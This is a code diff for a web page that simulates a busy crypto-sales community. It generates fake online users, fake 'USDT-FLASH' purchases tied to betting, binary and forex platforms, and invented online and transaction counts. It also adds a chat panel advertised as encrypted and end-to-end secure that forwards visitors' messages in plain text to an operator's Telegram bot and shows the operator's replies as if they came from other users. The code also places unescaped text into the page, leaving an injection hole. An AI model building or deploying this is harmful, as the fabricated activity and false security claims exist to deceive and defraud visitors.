+        const onlineUsers = [];
+        const usedIndices = new Set();
+        while (onlineUsers.length < 150 && usedIndices.size < userNames.length) {
+            const idx = Math.floor(Math.random() * userNames.length);
+            if (!usedIndices.has(idx)) {
+                usedIndices.add(idx);
+                onlineUsers.push({
+                    id: 'U' + String(idx + 1).padStart(4, '0'),
+                    name: userNames[idx],
+                    country: getRandom(countries),
+                    platform: getRandom([...elitePlatforms, ...bettingPlatforms, ...binaryPlatforms, ...forexPlatforms]),
+                    isVerified: Math.random() > 0.3,
+                    isNew: Math.random() > 0.85,
+                    status: Math.random() > 0.15 ? 'online' : 'away'
+                });
+            }
+        }
+
+        function getInitial(name) { return name.charAt(0); }
+
+        function renderUsers() {
+            const html = onlineUsers.map(u => {
+                const safeName = u.name.replace(/'/g, "\\'");
+                return `
+                <div class="user-row" onclick="openPrivateChat('${u.id}', '${safeName}', '${getInitial(u.name)}', ${u.isVerified})">
+                    <div class="w-9 h-9 rounded-full flex items-center justify-center text-white text-sm font-bold flex-shrink-0 ${u.isVerified ? 'bg-green-600' : 'bg-gray-500'}">${getInitial(u.name)}</div>
+                    <div class="flex-1 min-w-0">
+                        <div class="flex items-center gap-1.5">
+                            <span class="text-sm font-medium text-gray-800 truncate">${u.name}</span>
+                            ${u.isVerified ? '<i class="fas fa-check-circle text-green-500 text-xs"></i>' : ''}
+                        </div>
+                        <div class="flex items-center gap-2 text-xs text-gray-500">
+                            <span>${u.platform}</span>
+                            <span>${u.country}</span>
+                        </div>
+                    </div>
+                    <span class="w-2 h-2 rounded-full ${u.status === 'online' ? 'bg-green-400' : 'bg-gray-300'} flex-shrink-0"></span>
+                </div>
+            `}).join('');
+            const desktopList = document.getElementById('online-users-list');
+            if (desktopList) desktopList.innerHTML = html;
+            const mobileList = document.getElementById('online-users-list-mobile');
+            if (mobileList) mobileList.innerHTML = html;
+        }
+
+        // Transaction Feed
+        function addTransaction() {
+            const user = getRandom(onlineUsers);
+            
+            const isConversion = Math.random() > 0.5;
+            let planName, amount, platform, category;
+            
+            if (isConversion) {
+                const idx = Math.floor(Math.random() * 3);
+                category = planCategories[idx];
+                amount = '500';
+                const price = planCategoryPrices[idx];
+                planName = category + ' (' + price + ')';
+                
+                if (idx === 0) platform = getRandom(bettingPlatforms);
+                else if (idx === 1) platform = getRandom(binaryPlatforms);
+                else platform = getRandom(forexPlatforms);
+            } else {
+                const idx = Math.floor(Math.random() * 3);
+                planName = planNames[idx];
+                amount = planAmounts[idx];
+                platform = getRandom(elitePlatforms);
+            }
+            
+            const html = `
+                <div class="flex items-center gap-3">
+                    <div class="w-9 h-9 rounded-full flex items-center justify-center text-white text-sm font-bold flex-shrink-0 bg-green-600 ring-2 ring-green-300 ring-offset-1">${getInitial(user.name)}</div>
+                    <div class="flex-1 min-w-0">
+                        <div class="flex items-center gap-2">
+                            <span class="text-sm font-semibold text-gray-800 truncate">${user.name}</span>
+                            <span class="text-xs font-semibold ${isConversion ? 'text-blue-600' : 'text-green-600'}">${planName}</span>
+                        </div>
+                        <div class="flex items-center gap-2 text-xs text-gray-500">
+                            <span>${platform}</span>
+                            <span>&middot;</span>
+                            <span>${amount} USDT-FLASH</span>
+                            <span>&middot;</span>
+                            <span>${timeAgo(new Date())}</span>
+                        </div>
+                    </div>
+                    <span class="text-xs font-medium text-green-600 bg-green-50 px-2 py-0.5 rounded-full border border-green-200">New</span>
+                </div>
+            `;
+            
+            ['transaction-feed', 'transaction-feed-mobile'].forEach(id => {
+                const feed = document.getElementById(id);
+                if (!feed) return;
+                const div = document.createElement('div');
+                div.className = 'tx-item new-tx';
+                div.innerHTML = html;
+                if (feed.firstChild) feed.insertBefore(div, feed.firstChild);
+                else feed.appendChild(div);
+                while (feed.children.length > 50) feed.removeChild(feed.lastChild);
+            });
+            
+            // Toast + badge for mobile
+            if (isMobile) {
+                showToast(user.name, planName, platform);
+                updateBadge();
+            }
+        }
+
+        
+
+        // Private Chat
+        function openPrivateChat(userId, name, initial, verified) {
+            let panel = document.getElementById('private-chat-panel');
+            if (!panel) {
+                panel = document.createElement('div');
+                panel.id = 'private-chat-panel';
+                panel.className = 'fixed right-0 top-0 h-full w-80 bg-white shadow-xl transform translate-x-full transition-transform duration-300 z-50 flex flex-col';
+                document.body.appendChild(panel);
+            }
+            panel.innerHTML = `
+                <div class="bg-gray-900 px-4 py-3 flex items-center justify-between">
+                    <div class="flex items-center gap-3">
+                        <div class="w-9 h-9 rounded-full flex items-center justify-center text-white font-bold text-sm bg-green-600">${initial}</div>
+                        <div>
+                            <div class="text-white font-semibold text-sm flex items-center gap-1">${name} ${verified ? '<i class="fas fa-check-circle text-green-300 text-xs"></i>' : ''}</div>
+                            <div class="flex items-center gap-1"><span class="w-1.5 h-1.5 bg-green-400 rounded-full"></span><span class="text-green-200 text-xs">Online</span></div>
+                        </div>
+                    </div>
+                    <button onclick="closePrivateChat()" class="text-gray-400 hover:text-white text-lg">&times;</button>
+                </div>
+                <div id="private-chat-messages" class="flex-1 overflow-y-auto p-4 bg-gray-50 scroll-thin">
+                    <div class="text-center text-gray-400 text-xs mb-3"><i class="fas fa-lock mr-1"></i> Encrypted chat with ${name}</div>
+                </div>
+                <div class="p-4 border-t border-gray-200">
+                    <div class="flex gap-2">
+                        <input type="text" id="private-chat-input" placeholder="Type a message..." class="flex-1 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:border-green-500 text-sm">
+                        <button onclick="sendPrivateMessage('${userId}', '${name}')" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg text-sm transition"><i class="fas fa-paper-plane"></i></button>
+                    </div>
+                    <p class="text-xs text-gray-500 mt-2"><i class="fas fa-shield-check text-green-600 mr-1"></i> Secure end-to-end</p>
+                </div>
+            `;
+            setTimeout(() => panel.style.transform = 'translateX(0)', 10);
+            setTimeout(() => {
+                const input = document.getElementById('private-chat-input');
+                if (input) {
+                    input.addEventListener('keypress', function(e) { if (e.key === 'Enter') sendPrivateMessage(userId, name); });
+                    input.focus();
+                }
+            }, 100);
+            startPolling(userId, name);
+        }
+
+        function closePrivateChat() {
+            const panel = document.getElementById('private-chat-panel');
+            if (panel) {
+                panel.style.transform = 'translateX(100%)';
+                setTimeout(() => { if (panel.parentNode) panel.parentNode.removeChild(panel); }, 300);
+            }
+            if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+        }
+
+        function startPolling(userId, userName) {
+            if (pollTimer) clearInterval(pollTimer);
+            const seen = new Set();
+
+            pollTimer = setInterval(() => {
+                const container = document.getElementById('private-chat-messages');
+                if (!container) return;
+
+                fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/getUpdates?offset=' + pollOffset + '&timeout=5')
+                    .then(r => r.json())
+                    .then(data => {
+                        if (!data.ok || !data.result) return;
+                        data.result.forEach(upd => {
+                            if (upd.update_id <= lastUpdateId) return;
+                            lastUpdateId = upd.update_id;
+                            pollOffset = upd.update_id + 1;
+
+                            const msg = upd.message;
+                            if (!msg || !msg.text) return;
+                            if (msg.chat.id.toString() !== TELEGRAM_CHAT_ID) return;
+                            const lower = msg.text.toLowerCase();
+                            if (lower.startsWith('/reply ')) {
+                                const rest = msg.text.slice(7).trim();
+                                const spaceIdx = rest.indexOf(' ');
+                                if (spaceIdx === -1) return;
+                                const targetId = rest.slice(0, spaceIdx);
+                                const replyText = rest.slice(spaceIdx + 1).trim();
+                                const key = targetId + ':' + replyText;
+                                if (targetId === userId && !seen.has(key)) {
+                                    seen.add(key);
+                                    const div = document.createElement('div');
+                                    div.className = 'flex justify-start mb-2';
+                                    div.innerHTML = `<div class="bg-white border border-gray-200 text-gray-800 px-3 py-2 rounded-xl rounded-bl-sm text-sm max-w-[80%] shadow-sm">${replyText}</div>`;
+                                    container.appendChild(div);
+                                    container.scrollTop = container.scrollHeight;
+                                }
+                            }
+                        });
+                    })
+                    .catch(() => {});
+            }, 3000);
+        }
+
+        function sendPrivateMessage(userId, userName) {
+            const input = document.getElementById('private-chat-input');
+            const text = input.value.trim();
+            if (!text) return;
+            
+            const container = document.getElementById('private-chat-messages');
+            const msgDiv = document.createElement('div');
+            msgDiv.className = 'flex justify-end mb-2';
+            msgDiv.innerHTML = `<div class="bg-green-600 text-white px-3 py-2 rounded-xl rounded-br-sm text-sm max-w-[80%]">${text}</div>`;
+            container.appendChild(msgDiv);
+            container.scrollTop = container.scrollHeight;
+            input.value = '';
+            
+            const message = `<b>💬 ${userName}</b> [<code>${userId}</code>]\n\n${text}\n\nReply: <code>/reply ${userId} your message</code>`;
+            fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+            }).catch(() => {});
+        }
+
+        // Update Live Time
+        function updateLiveTime() {
+            const el = document.getElementById('live-time');
+            if (el) el.textContent = new Date().toLocaleTimeString();
+        }
+        setInterval(updateLiveTime, 1000);
+        updateLiveTime();
+
+        // Init
+        renderUsers();
+        
+        // Seed feed
+        for (let i = 0; i < 8; i++) setTimeout(addTransaction, i * 400);
+
+        // New purchase every 30 seconds
+        setInterval(addTransaction, 30000);
+        
+        // Countdown timer
+        let countdown = 30;
+        setInterval(() => {
+            countdown = countdown <= 1 ? 30 : countdown - 1;
+            const el1 = document.getElementById('feed-countdown');
+            const el2 = document.getElementById('feed-countdown-mobile');
+            const txt = String(countdown);
+            if (el1) el1.textContent = txt;
+            if (el2) el2.textContent = txt;
+        }, 1000);
+
+        // Sync online counts & fluctuate
+        function updateOnlineCount() {
+            const sidebar = document.getElementById('sidebar-online-count');
+            const sidebarDt = document.getElementById('sidebar-online-count-dt');
+            const status = document.getElementById('status-online-count');
+            const base = 2847;
+            const fluctuation = Math.floor(Math.random() * 701) - 350;
+            const count = (base + fluctuation).toLocaleString();
+            if (sidebar) sidebar.textContent = count;
+            if (sidebarDt) sidebarDt.textContent = count;
+            if (status) status.textContent = count;
+        }
+        setInterval(updateOnlineCount, 8000);
+        updateOnlineCount();
+
+        // Update counters
+        setInterval(() => {
+            const counter = document.getElementById('total-transactions');
+            if (counter) {
+                let val = Number(counter.textContent.replace(/,/g,''));
+                counter.textContent = (val + Math.floor(Math.random() * 5 + 1)).toLocaleString();
+            }
+        }, 8000);
+        
+        // ===== Mobile UX: Toast =====
+        function showToast(name, planName, platform) {
+            const container = document.getElementById('toast-container');
+            if (!container) return;
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = `
+                <div class="toast-icon bg-green-500 text-white"><i class="fas fa-cart-plus"></i></div>
+                <div class="flex-1 min-w-0">
+                    <div class="font-semibold text-white text-xs truncate">${name}</div>
+                    <div class="text-gray-300 text-[10px] truncate">${planName} &middot; ${platform}</div>
+                </div>
+                <span class="text-green-300 text-[10px] font-medium">now</span>
+            `;
+            container.appendChild(toast);
+            setTimeout(() => {
+                toast.classList.add('out');
+                setTimeout(() => { if (toast.parentNode) toast.parentNode.removeChild(toast); }, 300);
+            }, 3000);
+        }
+
+        // ===== Mobile UX: Badge =====
+        let badgeCount = 0;
+        function updateBadge() {
+            badgeCount++;
+            const badge = document.getElementById('purchase-badge');
+            if (!badge) return;
+            badge.textContent = badgeCount;
+            badge.classList.add('show');
+        }
+        function clearBadge() {
+            badgeCount = 0;
+            const badge = document.getElementById('purchase-badge');
+            if (badge) { badge.textContent = '0'; badge.classList.remove('show'); }
+        }
+
+        // ===== Mobile UX: Scroll Position per Tab =====
+        const scrollPositions = { users: 0, journey: 0, purchases: 0 };
+        function saveScroll(tab) {
+            const panel = document.getElementById('tab-' + tab + '-mobile');
+            if (!panel) return;
+            const scroller = panel.querySelector('.tab-scroll, .users-list, .tx-feed');
+            if (scroller) scrollPositions[tab] = scroller.scrollTop;
+        }
+        function restoreScroll(tab) {
+            const panel = document.getElementById('tab-' + tab + '-mobile');
+            if (!panel) return;
+            const scroller = panel.querySelector('.tab-scroll, .users-list, .tx-feed');
+            if (scroller && scrollPositions[tab]) setTimeout(() => { scroller.scrollTop = scrollPositions[tab]; }, 50);
+        }
+
+        // ===== Mobile UX: Pull to Refresh =====
+        let ptrState = 'idle';
+        let ptrStartY = 0;
+        function initPtr() {
+            const list = document.getElementById('online-users-list-mobile');
+            if (!list) return;
+            list.addEventListener('touchstart', function(e) {
+                if (this.scrollTop === 0) {
+                    ptrState = 'possible';
+                    ptrStartY = e.touches[0].clientY;
+                }
+            }, { passive: true });
+            list.addEventListener('touchmove', function(e) {
+                if (ptrState === 'possible' || ptrState === 'pulling') {
+                    const diff = e.touches[0].clientY - ptrStartY;
+                    if (diff > 10) {
+                        ptrState = 'pulling';
+                        const indicator = document.getElementById('ptr-indicator');
+                        if (indicator) {
+                            indicator.classList.add('show');
+                            if (diff > 80) indicator.classList.add('ready');
+                            else indicator.classList.remove('ready');
+                        }
+                    }
+                }
+            }, { passive: true });
+            list.addEventListener('touchend', function() {
+                const indicator = document.getElementById('ptr-indicator');
+                if (ptrState === 'pulling' && indicator && indicator.classList.contains('ready')) {
+                    indicator.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Refreshing...';
+                    setTimeout(() => {
+                        indicator.classList.remove('show', 'ready');
+                        indicator.innerHTML = '<i class="fas fa-arrow-down"></i> Pull to refresh';
+                        ptrState = 'idle';
+                    }, 1200);
+                } else {
+                    if (indicator) indicator.classList.remove('show', 'ready');
+                    ptrState = 'idle';
+                }
+            }, { passive: true });
+        }
+
+        // ===== Mobile UX: Swipe Gesture Tab Switching =====
+        let isMobile = false;
+        let currentTab = 'users';
+        const tabOrder = ['users', 'journey', 'purchases'];
+        
+        function getNavIndicatorPos(tab) {
+            const btns = document.querySelectorAll('.mobile-nav-btn');
+            const idx = tabOrder.indexOf(tab);
+            if (idx === -1 || !btns[idx]) return { left: 0, width: 0 };
+            const btn = btns[idx];
+            const nav = btn.closest('.mobile-nav-inner');
+            if (!nav) return { left: 0, width: 0 };
+            const navRect = nav.getBoundingClientRect();
+            const btnRect = btn.getBoundingClientRect();
+            return {
+                left: btnRect.left - navRect.left,
+                width: btnRect.width
+            };
+        }
+
+        function updateNavIndicator(tab) {
+            const indicator = document.getElementById('nav-indicator');
+            if (!indicator) return;
+            const pos = getNavIndicatorPos(tab);
+            indicator.style.left = pos.left + 'px';
+            indicator.style.width = pos.width + 'px';
+        }
+
+        function switchTab(tab, direction) {
+            if (tab === currentTab) return;
+            saveScroll(currentTab);
+            
+            const oldTab = currentTab;
+            currentTab = tab;
+            
+            const oldPanel = document.getElementById('tab-' + oldTab + '-mobile');
+            const newPanel = document.getElementById('tab-' + tab + '-mobile');
+            if (!oldPanel || !newPanel) return;
+            
+            // Determine slide direction
+            const oldIdx = tabOrder.indexOf(oldTab);
+            const newIdx = tabOrder.indexOf(tab);
+            const dir = direction || (newIdx > oldIdx ? 1 : -1);
+            
+            if (tab === 'purchases') clearBadge();
+            
+            // Prevent container collapse: old panel stays relative throughout animation
+            const container = document.getElementById('tab-container');
+            if (container) container.style.minHeight = oldPanel.offsetHeight + 'px';
+            
+            // Position new panel off-screen
+            newPanel.style.transition = 'none';
+            newPanel.style.transform = dir === 1 ? 'translateX(100%)' : 'translateX(-100%)';
+            newPanel.style.position = 'absolute';
+            newPanel.style.top = '0';
+            newPanel.style.left = '0';
+            newPanel.style.opacity = '1';
+            newPanel.style.pointerEvents = 'none';
+            
+            void newPanel.offsetHeight;
+            
+            // Animate old panel out (keeps position:relative → container has height)
+            oldPanel.style.transition = 'transform 0.35s cubic-bezier(.4,0,.2,1), opacity 0.35s ease';
+            oldPanel.style.transform = dir === 1 ? 'translateX(-20%)' : 'translateX(20%)';
+            oldPanel.style.opacity = '0.6';
+            oldPanel.style.pointerEvents = 'none';
+            
+            // Animate new panel in
+            newPanel.style.transition = 'transform 0.35s cubic-bezier(.4,0,.2,1), opacity 0.35s ease';
+            newPanel.style.transform = 'translateX(0%)';
+            
+            // Nav buttons
+            document.querySelectorAll('.mobile-nav-btn').forEach(el => el.classList.remove('active'));
+            const btn = document.querySelector('.mobile-nav-btn[data-tab="' + tab + '"]');
+            if (btn) btn.classList.add('active');
+            updateNavIndicator(tab);
+            
+            // Cleanup after animation
+            setTimeout(() => {
+                oldPanel.style.transition = 'none';
+                oldPanel.style.transform = '';
+                oldPanel.style.opacity = '';
+                oldPanel.style.position = '';
+                oldPanel.style.pointerEvents = '';
+                oldPanel.classList.remove('tab-active');
+                
+                newPanel.style.transition = 'none';
+                newPanel.style.transform = '';
+                newPanel.style.opacity = '';
+                newPanel.style.position = 'relative';
+                newPanel.style.top = '';
+                newPanel.style.left = '';
+                newPanel.style.pointerEvents = 'auto';
+                newPanel.classList.add('tab-active');
+                
+                if (container) container.style.minHeight = '';
+                
+                restoreScroll(tab);
+            }, 380);
+        }
+
+        function initSwipe() {
+            const container = document.getElementById('tab-container');
+            if (!container) return;
+            
+            let startX = 0, startY = 0, diffX = 0, isSwiping = false;
+            
+            container.addEventListener('touchstart', function(e) {
+                const target = e.target;
+                if (target.closest('.tab-scroll') || target.closest('.users-list') || target.closest('.tx-feed')) {
+                    return;
+                }
+                startX = e.touches[0].clientX;
+                startY = e.touches[0].clientY;
+                diffX = 0;
+                isSwiping = false;
+            }, { passive: true });
+            
+            container.addEventListener('touchmove', function(e) {
+                const dx = e.touches[0].clientX - startX;
+                const dy = e.touches[0].clientY - startY;
+                
+                if (!isSwiping && Math.abs(dx) > 10 && Math.abs(dx) > Math.abs(dy) * 1.5) {
+                    isSwiping = true;
+                }
+                
+                if (isSwiping) {
+                    diffX = dx;
+                    const idx = tabOrder.indexOf(currentTab);
+                    const canGoPrev = idx > 0;
+                    const canGoNext = idx < tabOrder.length - 1;
+                    
+                    if ((dx < 0 && canGoNext) || (dx > 0 && canGoPrev)) {
+                        const activePanel = document.getElementById('tab-' + currentTab + '-mobile');
+                        if (!activePanel) return;
+                        
+                        activePanel.style.transition = 'none';
+                        activePanel.style.transform = 'translateX(' + dx + 'px)';
+                        
+                        const nextTab = dx < 0 ? tabOrder[idx + 1] : tabOrder[idx - 1];
+                        const nextPanel = document.getElementById('tab-' + nextTab + '-mobile');
+                        if (nextPanel) {
+                            nextPanel.style.transition = 'none';
+                            nextPanel.style.position = 'absolute';
+                            nextPanel.style.top = '0';
+                            nextPanel.style.left = '0';
+                            nextPanel.style.transform = dx < 0 ? 'translateX(calc(100% + ' + dx + 'px))' : 'translateX(calc(-100% + ' + dx + 'px))';
+                            nextPanel.style.pointerEvents = 'none';
+                        }
+                    }
+                }
+            }, { passive: true });
+            
+            container.addEventListener('touchend', function() {
+                if (!isSwiping) return;
+                isSwiping = false;
+                
+                const threshold = 80;
+                const idx = tabOrder.indexOf(currentTab);
+                const canGoPrev = idx > 0;
+                const canGoNext = idx < tabOrder.length - 1;
+                
+                if (diffX < -threshold && canGoNext) {
+                    switchTab(tabOrder[idx + 1]);
+                } else if (diffX > threshold && canGoPrev) {
+                    switchTab(tabOrder[idx - 1]);
+                } else {
+                    // Snap back
+                    const panel = document.getElementById('tab-' + currentTab + '-mobile');
+                    if (panel) {
+                        panel.style.transition = 'transform 0.25s ease';
+                        panel.style.transform = 'translateX(0%)';
+                        setTimeout(() => { panel.style.transition = 'none'; }, 260);
+                    }
+                    tabOrder.forEach(t => {
+                        if (t !== currentTab) {
+                            const p = document.getElementById('tab-' + t + '-mobile');
+                            if (p) {
+                                p.style.transition = 'none';
+                                p.style.transform = '';
+                                p.style.position = '';
+                                p.style.top = '';
+                                p.style.left = '';
+                                p.style.pointerEvents = '';
+                            }
+                        }
+                    });
+                }
+                diffX = 0;
+            }, { passive: true });
+        }
+
+        // ===== Init Mobile UX =====
+        if (window.innerWidth < 1024) {
+            isMobile = true;
+            // Nav button event listeners
+            document.querySelectorAll('.mobile-nav-btn').forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    const tab = this.getAttribute('data-tab');
+                    if (tab) switchTab(tab);
+                });
+            });
+            // Set initial nav indicator and button state
+            const initBtn = document.querySelector('.mobile-nav-btn[data-tab="users"]');
+            if (initBtn) initBtn.classList.add('active');
+            updateNavIndicator('users');
+            setTimeout(() => {
+                initPtr();
+                initSwipe();
+            }, 100);
+        }
+    </script>
+</body>
+</html>
